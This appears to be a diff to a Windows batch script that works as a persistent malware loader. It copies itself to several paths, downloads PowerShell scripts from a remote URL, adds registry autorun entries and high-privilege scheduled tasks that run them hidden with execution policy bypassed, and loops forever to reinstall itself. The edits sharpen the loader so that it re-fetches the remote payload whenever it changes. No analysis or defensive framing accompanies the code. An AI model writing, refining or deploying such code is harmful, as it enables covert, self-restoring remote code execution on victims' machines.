@@ -61,15 +61,12 @@ copy /y "%~f0" "%BAT3%"
 :: Download PowerShell scripts
 :: ========================
 echo [INFO] Downloading PowerShell scripts...
-
 powershell -Command ^
- "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString(\"%SCRIPT_URL%\"); Set-Content -Path \"%LOC1%\" -Value $s"
-
+ "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString('%SCRIPT_URL%'); Set-Content -Path '%LOC1%' -Value $s"
 powershell -Command ^
- "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString(\"%SCRIPT_URL%\"); Set-Content -Path \"%LOC2%\" -Value $s"
-
+ "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString('%SCRIPT_URL%'); Set-Content -Path '%LOC2%' -Value $s"
 powershell -Command ^
- "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString(\"%SCRIPT_URL%\"); Set-Content -Path \"%LOC3%\" -Value $s"
+ "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString('%SCRIPT_URL%'); Set-Content -Path '%LOC3%' -Value $s"
 
 :: ========================
 :: Register autorun entries
@@ -86,13 +83,10 @@ reg add "%REG_PATH%" /v "%PSKEY3%" /d "powershell -ExecutionPolicy Bypass -Windo
 :: Create multiple scheduled tasks for persistence
 :: ========================
 echo [INFO] Creating scheduled tasks...
-:: Every 10 min
 schtasks /create /f /sc minute /mo 10 /tn "%TASKNAME1%" /tr "\"%BAT1%\"" /rl HIGHEST
 schtasks /create /f /sc minute /mo 10 /tn "%TASKNAME2%" /tr "\"%BAT2%\"" /rl HIGHEST
 schtasks /create /f /sc minute /mo 10 /tn "%TASKNAME3%" /tr "\"%BAT3%\"" /rl HIGHEST
-:: On boot
 schtasks /create /f /sc onstart /tn "%TASKNAME4%" /tr "\"%BAT1%\"" /rl HIGHEST
-:: On logon
 schtasks /create /f /sc onlogon /tn "%TASKNAME5%" /tr "\"%BAT2%\"" /rl HIGHEST
 
 :: ========================
@@ -105,15 +99,15 @@ if not exist "%BAT1%" copy /y "%~f0" "%BAT1%"
 if not exist "%BAT2%" copy /y "%~f0" "%BAT2%"
 if not exist "%BAT3%" copy /y "%~f0" "%BAT3%"
 
-:: Ensure PowerShell scripts exist
-if not exist "%LOC1%" powershell -Command ^
- "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString(\"%SCRIPT_URL%\"); Set-Content -Path \"%LOC1%\" -Value $s"
+:: Ensure PowerShell scripts exist AND match remote content
+powershell -Command ^
+ "$p='%LOC1%'; $wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString('%SCRIPT_URL%'); if(!(Test-Path $p) -or (Get-Content $p -Raw) -ne $s){Set-Content -Path $p -Value $s}"
 
-if not exist "%LOC2%" powershell -Command ^
- "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString(\"%SCRIPT_URL%\"); Set-Content -Path \"%LOC2%\" -Value $s"
+powershell -Command ^
+ "$p='%LOC2%'; $wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString('%SCRIPT_URL%'); if(!(Test-Path $p) -or (Get-Content $p -Raw) -ne $s){Set-Content -Path $p -Value $s}"
 
-if not exist "%LOC3%" powershell -Command ^
- "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString(\"%SCRIPT_URL%\"); Set-Content -Path \"%LOC3%\" -Value $s"
+powershell -Command ^
+ "$p='%LOC3%'; $wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString('%SCRIPT_URL%'); if(!(Test-Path $p) -or (Get-Content $p -Raw) -ne $s){Set-Content -Path $p -Value $s}"
 
 :: Re-register autorun entries if missing
 reg query "%REG_PATH%" /v "%BATKEY1%" >nul 2>&1 || reg add "%REG_PATH%" /v "%BATKEY1%" /d "\"%BAT1%\"" /f
@@ -123,11 +117,11 @@ reg query "%REG_PATH%" /v "%PSKEY1%" >nul 2>&1 || reg add "%REG_PATH%" /v "%PSKE
 reg query "%REG_PATH%" /v "%PSKEY2%" >nul 2>&1 || reg add "%REG_PATH%" /v "%PSKEY2%" /d "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%LOC2%\"" /f
 reg query "%REG_PATH%" /v "%PSKEY3%" >nul 2>&1 || reg add "%REG_PATH%" /v "%PSKEY3%" /d "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%LOC3%\"" /f
 
-:: Execute the PowerShell scripts silently
+:: Execute PowerShell scripts silently
 powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%LOC1%"
 powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%LOC2%"
 powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%LOC3%"
 
-:: Wait 10 seconds and repeat
+:: Wait and repeat
 timeout /t 10 >nul
 goto loop
